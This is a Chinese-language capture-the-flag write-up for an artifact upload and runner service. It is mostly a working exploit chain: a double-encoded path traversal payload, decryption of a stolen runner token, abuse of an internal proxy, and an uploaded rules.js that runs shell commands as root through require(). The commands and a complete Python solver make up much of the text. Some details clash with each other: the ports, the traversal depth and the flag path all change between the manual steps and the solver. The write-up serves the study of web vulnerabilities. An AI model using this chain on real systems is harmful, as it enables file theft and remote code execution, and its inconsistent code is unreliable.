# Artifact Relay

## 题目简述

题目是一个 artifact 上传、报告查看和内部 runner 扫描系统。公开 Web 入口可以上传 artifact 并访问报告文件；runner 侧持有加密 token 和更高权限，只有被标记为 trusted 的 artifact 才会触发内部扫描逻辑。

完整利用链由三个漏洞协作完成：`/reports/:artifactId/file` 在 URL 解码前检查 `..`，可用双重编码路径穿越读取 `lib/crypto.js` 和 `runner_token.enc`；拿到 AES key/IV 后解密 runner token，再借公开 API 访问内部 runner；最后上传包含 `.relay/rules.js` 的恶意 artifact，利用 trusted scan 中的不受信任 `require()` 在 runner 进程执行代码，读取 `/root/flag.txt`。

## 解题过程

### 攻击路径一：RCE via Trusted Scan（主要路径）

### Step 1: 通过路径穿越读取 lib/crypto.js

漏洞点在 `/reports/:artifactId/file` 端点。关键代码：

```js
// 先检查字面量 '..'  
if (sanitized.includes('..')) { return res.status(403)... }

// 然后才进行双重 URL 解码
sanitized = decodeURIComponent(sanitized);
if (sanitized.includes('%')) { sanitized = decodeURIComponent(sanitized); }
```

检查发生在解码之前！发送**双重编码**的 `..` 即可绕过：

- `%252e` → 第一次解码 → `%2e` → 第二次解码 → `.`
- `%252f` → 第一次解码 → `%2f` → 第二次解码 → `/`

##### 1. 先上传一个普通 artifact 获取 artifactId：
```bash
# 创建测试文件
mkdir -p test_artifact
echo "hello" > test_artifact/readme.txt
tar -czf test.tar.gz -C test_artifact .

# 上传
curl -X POST http://localhost:80/upload \
  -F "name=test" \
  -F "artifact=@test.tar.gz" -v 2>&1 | grep -i location
# 重定向到 /artifact/<ARTIFACT_ID>
```

##### 2. 路径穿越读取 lib/crypto.js：
```bash
ARTIFACT_ID="<上面获取的 ID>"
curl "http://localhost:8080/reports/${ARTIFACT_ID}/file?name=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp%252flib%252fcrypto.js"
```

获取到的内容包含：
```js
const SECRET_KEY = Buffer.from('Artifact-R3l4y-Secure-K3y-2026!!', 'utf8'); // 32 bytes
const IV = Buffer.from('R3l4y-IV-2026!!!', 'utf8'); // 16 bytes
```

利用时应从响应正文中提取这两个字符串，再继续下一步。

### Step 2: 读取并解密 Runner Token

同理读取加密的 token：
```bash
curl "http://localhost:80/reports/${ARTIFACT_ID}/file?name=%252e%252e%252f%252e%252e%252fdata%252frunner_token.enc"
```

使用 Node.js 解密（AES-256-CBC）：
```js
const crypto = require('crypto');
const cryptoJs = `<上一步读取到的 lib/crypto.js 内容>`;
const keyMatch = cryptoJs.match(/SECRET_KEY\s*=\s*Buffer\.from\('([^']+)',\s*'utf8'\)/);
const ivMatch = cryptoJs.match(/\bIV\s*=\s*Buffer\.from\('([^']+)',\s*'utf8'\)/);
const KEY = Buffer.from(keyMatch[1], 'utf8');
const IV = Buffer.from(ivMatch[1], 'utf8');

// 填入上面获取到的 hex
const encrypted = '<hex_from_runner_token.enc>';

const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
let token = decipher.update(encrypted, 'hex', 'utf8');
token += decipher.final('utf8');
console.log(token); // 供后续 X-Runner-Token 使用
```

或使用 Python：
```python
import re
from Crypto.Cipher import AES

crypto_js = """<上一步读取到的 lib/crypto.js 内容>"""
key_match = re.search(r"SECRET_KEY\s*=\s*Buffer\.from\('([^']+)',\s*'utf8'\)", crypto_js)
iv_match = re.search(r"\bIV\s*=\s*Buffer\.from\('([^']+)',\s*'utf8'\)", crypto_js)
KEY = key_match.group(1).encode()
IV  = iv_match.group(1).encode()

enc = bytes.fromhex('<hex_from_runner_token.enc>')
cipher = AES.new(KEY, AES.MODE_CBC, IV)
plain = cipher.decrypt(enc)
# Remove PKCS7 padding
token = plain[:-plain[-1]].decode()
print(token)  # 供后续 X-Runner-Token 使用
```

### Step 3: 上传恶意 Artifact (包含 RCE Payload)

创建 `.relay/rules.js`，其中 `scan()` 函数会在 runner 进程（root）中被 `require()` 执行：

```bash
mkdir -p exploit/.relay

cat > exploit/.relay/rules.js << 'RCE_EOF'
const { execSync } = require('child_process');
module.exports = {
  scan: function(artifactInfo) {
    const flag = execSync('cat /root/flag.txt').toString().trim();
    return [{ severity: 'critical', message: 'FLAG: ' + flag }];
  }
};
RCE_EOF

echo "dummy" > exploit/readme.txt

# 打包（注意路径结构，要使 .relay/ 在 artifact 根目录下）
tar -czf payload.tar.gz -C exploit .
```

上传：
```bash
curl -X POST http://localhost:80/upload \
  -F "name=exploit" \
  -F "artifact=@payload.tar.gz" -v 2>&1 | grep -i location
```

记下重定向中的 artifact ID。

### Step 4: 通过 SSRF 标记为 Trusted 并触发 Trusted Scan

公共服务器的 `/internal/runner/*` 路径为 SSRF 桥梁，将请求转发到内部 Runner API。

```bash
ARTIFACT_ID="<exploit artifact ID>"
TOKEN="<上一步解密得到的 runner token>"

# Step 4a: 标记为 trusted
curl -X POST http://localhost:80/internal/runner/mark-trusted \
  -H "Content-Type: application/json" \
  -H "X-Runner-Token: ${TOKEN}" \
  -d "{\"artifactId\":\"${ARTIFACT_ID}\"}"

# Step 4b: 触发 trusted scan（runner 将 require('.relay/rules.js') → RCE）
curl -X POST http://localhost:80/internal/runner/trusted-scan \
  -H "Content-Type: application/json" \
  -H "X-Runner-Token: ${TOKEN}" \
  -d "{\"artifactId\":\"${ARTIFACT_ID}\"}"
```

### Step 5: 读取 Flag

等待几秒让扫描完成，然后查看 artifact 的扫描报告：

```bash
curl "http://localhost:80/artifact/${ARTIFACT_ID}" | grep -o 'FLAG: flag{[^}]*}'
```

Flag 将出现在扫描报告的 findings 中。

---

### 一键 Solver 脚本 (Python)

```python
#!/usr/bin/env python3
import requests
import tarfile
import io
import time
import re
from Crypto.Cipher import AES

BASE = "http://localhost:80"

def create_tar_with_file(filepath, content):
    """Create a tar.gz bytes containing the given file."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        info = tarfile.TarInfo(name=filepath)
        info.size = len(content)
        tar.addfile(info, io.BytesIO(content))
    return buf.getvalue()

# ===== Step 1: Upload dummy artifact =====
dummy_tar = create_tar_with_file("readme.txt", b"dummy")
resp = requests.post(f"{BASE}/upload", 
    data={"name": "test"},
    files={"artifact": ("test.tar.gz", dummy_tar, "application/gzip")},
    allow_redirects=False)
location = resp.headers["Location"]  # /artifact/<id>
dummy_id = location.split("/")[-1]

# ===== Step 2: Path traversal to read lib/crypto.js =====
crypto_path = "%252e%252e%252f" * 5 + "app%252flib%252fcrypto.js"
resp = requests.get(f"{BASE}/reports/{dummy_id}/file", params={"name": crypto_path})
crypto_js = resp.text
key_match = re.search(r"SECRET_KEY\s*=\s*Buffer\.from\('([^']+)',\s*'utf8'\)", crypto_js)
iv_match = re.search(r"\bIV\s*=\s*Buffer\.from\('([^']+)',\s*'utf8'\)", crypto_js)
KEY = key_match.group(1).encode()
IV  = iv_match.group(1).encode()

# ===== Step 3: Read encrypted token via path traversal =====
traversal2 = "%252e%252e%252f" * 2 + "data%252frunner_token.enc"
resp = requests.get(f"{BASE}/reports/{dummy_id}/file", params={"name": traversal2})
enc_hex = resp.text.strip()

cipher = AES.new(KEY, AES.MODE_CBC, IV)
token = cipher.decrypt(bytes.fromhex(enc_hex))
# Remove PKCS7 padding
pad_len = token[-1]
token = token[:-pad_len].decode()
print(f"[+] Runner token: {token}")

# ===== Step 4: Upload malicious artifact with .relay/rules.js =====
rules_js = b'''
const { execSync } = require('child_process');
module.exports = {
  scan: function(artifactInfo) {
    const flag = execSync('cat /root/flag').toString().trim();
    return [{ severity: 'critical', message: 'FLAG: ' + flag }];
  }
};
'''

# Create tar with .relay/rules.js
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tar:
    for name, data in [
        (".relay/rules.js", rules_js),
        ("readme.txt", b"dummy")
    ]:
        info = tarfile.TarInfo(name=name)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
payload_tar = buf.getvalue()

resp = requests.post(f"{BASE}/upload",
    data={"name": "exploit"},
    files={"artifact": ("payload.tar.gz", payload_tar, "application/gzip")},
    allow_redirects=False)
exploit_id = resp.headers["Location"].split("/")[-1]
print(f"[+] Exploit artifact ID: {exploit_id}")

# ===== Step 5: Mark trusted & trigger scan =====
headers = {
    "Content-Type": "application/json",
    "X-Runner-Token": token
}
requests.post(f"{BASE}/internal/runner/mark-trusted",
    headers=headers, json={"artifactId": exploit_id})
requests.post(f"{BASE}/internal/runner/trusted-scan",
    headers=headers, json={"artifactId": exploit_id})

# ===== Step 6: Wait & read flag =====
time.sleep(3)
resp = requests.get(f"{BASE}/artifact/{exploit_id}")
import re
match = re.search(r'flag\{[^}]+\}', resp.text)
if match:
    print(f"[+] FLAG: {match.group(0)}")
else:
    print("[-] Flag not found in response")
    print(resp.text[:2000])
```

---

## 方法总结

| # | 漏洞 | 位置 | 描述 |
|---|------|------|------|
| 1 | 路径穿越 | `server.js:/reports/:artifactId/file` | 先检查 `..` 字面量，再双重 URL 解码 |
| 2 | 硬编码密钥 | `lib/crypto.js` | AES-256 密钥和 IV 直接写死在代码中 |
| 3 | SSRF 桥梁 | `server.js:/internal/*` | 公共服务器无认证转发请求到内部服务 |
| 4 | require() RCE | `internal-runner.js:122` | trusted scan 时直接 `require()` 用户上传的 JS，runner 以 root 运行 |
